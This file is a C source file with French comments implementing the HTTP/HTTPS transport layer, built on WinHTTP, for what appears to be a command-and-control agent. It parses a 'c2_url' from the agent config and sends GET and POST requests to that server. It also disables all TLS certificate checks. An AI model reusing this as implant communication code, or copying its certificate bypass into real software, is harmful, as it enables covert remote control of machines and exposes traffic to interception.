/*
 * transport.c - Implémentation du transport HTTP via WinHTTP
 */

#include "transport.h"
#include "../utils/memory.h"
#include "../utils/strings.h"

#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

/* ============================================================================
 * Fonctions internes
 * ============================================================================
 */

/*
 * Parse une URL et extrait le host, port, path.
 */
static bool parse_url(const char *url, char *host, size_t host_size,
                      INTERNET_PORT *port, bool *is_https) {
  /* Format attendu: http(s)://host:port/path */

  *is_https = false;
  *port = 80;

  const char *ptr = url;

  /* Check le scheme */
  if (strncmp(ptr, "https://", 8) == 0) {
    *is_https = true;
    *port = 443;
    ptr += 8;
  } else if (strncmp(ptr, "http://", 7) == 0) {
    *is_https = false;
    *port = 80;
    ptr += 7;
  } else {
    return false;
  }

  /* Extrait le host */
  const char *colon = strchr(ptr, ':');
  const char *slash = strchr(ptr, '/');

  if (colon && (!slash || colon < slash)) {
    /* Il y a un port explicite */
    size_t host_len = colon - ptr;
    if (host_len >= host_size)
      host_len = host_size - 1;
    strncpy(host, ptr, host_len);
    host[host_len] = '\0';

    /* Parse le port */
    *port = (INTERNET_PORT)atoi(colon + 1);
  } else if (slash) {
    /* Pas de port, juste le host */
    size_t host_len = slash - ptr;
    if (host_len >= host_size)
      host_len = host_size - 1;
    strncpy(host, ptr, host_len);
    host[host_len] = '\0';
  } else {
    /* Juste le host, pas de path */
    strncpy(host, ptr, host_size - 1);
    host[host_size - 1] = '\0';
  }

  return true;
}

/*
 * Effectue une requête HTTP.
 */
static int do_request(transport_ctx_t *ctx, const wchar_t *method,
                      const char *path, const char *data, char **response,
                      size_t *response_len) {
  if (!ctx || !ctx->initialized || !path) {
    return STATUS_FAILURE;
  }

  *response = NULL;
  *response_len = 0;

  /* Convertit le path en wide string */
  wchar_t *wpath = str_to_wstr(path);
  if (!wpath) {
    return STATUS_NO_MEMORY;
  }

  /* Ouvre une requête */
  DWORD flags = ctx->use_https ? WINHTTP_FLAG_SECURE : 0;
  HINTERNET request = WinHttpOpenRequest(ctx->connection, method, wpath, NULL,
                                         WINHTTP_NO_REFERER,
                                         WINHTTP_DEFAULT_ACCEPT_TYPES, flags);

  free(wpath);

  if (!request) {
    return STATUS_NETWORK_ERROR;
  }

  /* Si HTTPS, ignore les erreurs de certificat (pour les tests) */
  if (ctx->use_https) {
    DWORD security_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                           SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                           SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                           SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &security_flags,
                     sizeof(security_flags));
  }

  /* Headers */
  wchar_t headers[] = L"Content-Type: application/octet-stream\r\n";

  /* Envoie la requête */
  DWORD data_len = data ? (DWORD)strlen(data) : 0;
  BOOL result = WinHttpSendRequest(
      request, headers, -1L, data ? (LPVOID)data : WINHTTP_NO_REQUEST_DATA,
      data_len, data_len, 0);

  if (!result) {
    WinHttpCloseHandle(request);
    return STATUS_NETWORK_ERROR;
  }

  /* Attend la réponse */
  result = WinHttpReceiveResponse(request, NULL);
  if (!result) {
    WinHttpCloseHandle(request);
    return STATUS_NETWORK_ERROR;
  }

  /* Lit le body de la réponse */
  char *buffer = NULL;
  size_t total_size = 0;
  DWORD bytes_available = 0;

  do {
    bytes_available = 0;
    if (!WinHttpQueryDataAvailable(request, &bytes_available)) {
      break;
    }

    if (bytes_available == 0) {
      break;
    }

    /* Réalloue le buffer */
    char *new_buffer =
        (char *)realloc(buffer, total_size + bytes_available + 1);
    if (!new_buffer) {
      free(buffer);
      WinHttpCloseHandle(request);
      return STATUS_NO_MEMORY;
    }
    buffer = new_buffer;

    /* Lit les données */
    DWORD bytes_read = 0;
    if (!WinHttpReadData(request, buffer + total_size, bytes_available,
                         &bytes_read)) {
      free(buffer);
      WinHttpCloseHandle(request);
      return STATUS_NETWORK_ERROR;
    }

    total_size += bytes_read;

  } while (bytes_available > 0);

  WinHttpCloseHandle(request);

  if (buffer) {
    buffer[total_size] = '\0';
    *response = buffer;
    *response_len = total_size;
  }

  return STATUS_SUCCESS;
}

/* ============================================================================
 * Implémentation des fonctions publiques
 * ============================================================================
 */

int transport_init(transport_ctx_t *ctx, agent_config_t *config) {
  if (!ctx || !config) {
    return STATUS_FAILURE;
  }

  memset(ctx, 0, sizeof(transport_ctx_t));

  /* Parse l'URL du C2 */
  if (!parse_url(config->c2_url, ctx->host, sizeof(ctx->host), &ctx->port,
                 &ctx->use_https)) {
    return STATUS_FAILURE;
  }

  strncpy(ctx->user_agent, config->user_agent, sizeof(ctx->user_agent) - 1);

  /* Convertit le user-agent en wide string */
  wchar_t *wua = str_to_wstr(ctx->user_agent);
  if (!wua) {
    return STATUS_NO_MEMORY;
  }

  /* Ouvre une session WinHTTP */
  ctx->session = WinHttpOpen(wua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                             WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

  free(wua);

  if (!ctx->session) {
    return STATUS_NETWORK_ERROR;
  }

  /* Convertit le host en wide string */
  wchar_t *whost = str_to_wstr(ctx->host);
  if (!whost) {
    WinHttpCloseHandle(ctx->session);
    return STATUS_NO_MEMORY;
  }

  /* Ouvre une connexion */
  ctx->connection = WinHttpConnect(ctx->session, whost, ctx->port, 0);

  free(whost);

  if (!ctx->connection) {
    WinHttpCloseHandle(ctx->session);
    return STATUS_NETWORK_ERROR;
  }

  ctx->initialized = true;

  return STATUS_SUCCESS;
}

int transport_post(transport_ctx_t *ctx, const char *path, const char *data,
                   char **response, size_t *response_len) {
  return do_request(ctx, L"POST", path, data, response, response_len);
}

int transport_get(transport_ctx_t *ctx, const char *path, char **response,
                  size_t *response_len) {
  return do_request(ctx, L"GET", path, NULL, response, response_len);
}

void transport_cleanup(transport_ctx_t *ctx) {
  if (!ctx)
    return;

  if (ctx->connection) {
    WinHttpCloseHandle(ctx->connection);
    ctx->connection = NULL;
  }

  if (ctx->session) {
    WinHttpCloseHandle(ctx->session);
    ctx->session = NULL;
  }

  ctx->initialized = false;
}
